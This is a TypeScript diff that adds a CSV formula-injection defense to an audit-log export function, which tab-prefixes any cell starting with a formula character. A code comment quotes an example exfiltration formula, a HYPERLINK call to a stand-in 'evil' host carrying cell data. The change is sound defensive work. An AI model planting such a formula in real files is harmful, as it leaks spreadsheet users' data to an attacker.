@@ -23,7 +23,20 @@ function clampInt(value: string | undefined, def: number, min: number, max: numb
 
 function csvEscape(v: unknown): string {
   if (v === null || v === undefined) return '';
-  const s = String(v);
+  let s = String(v);
+  // CSV formula-injection defense (2026-05-23 launch audit P1):
+  // Excel / Numbers / LibreOffice / Google Sheets all interpret a
+  // cell starting with `=`, `+`, `-`, `@`, TAB, or CR as a formula.
+  // AuditLog `details` JSON can carry user-controlled strings (asset
+  // names, playlist names, emails); without prefixing, an admin
+  // double-clicking audit-2026-05-23.csv could trigger
+  //   =HYPERLINK("https://evil/exfil?d=" & A1)
+  // and exfiltrate data. Prefix with a tab so the formula doesn't
+  // evaluate but the visible value is still readable. OWASP CSV
+  // Injection cheatsheet, same defense Google Sheets uses on import.
+  if (/^[=+\-@\t\r]/.test(s)) {
+    s = `\t${s}`;
+  }
   if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 }
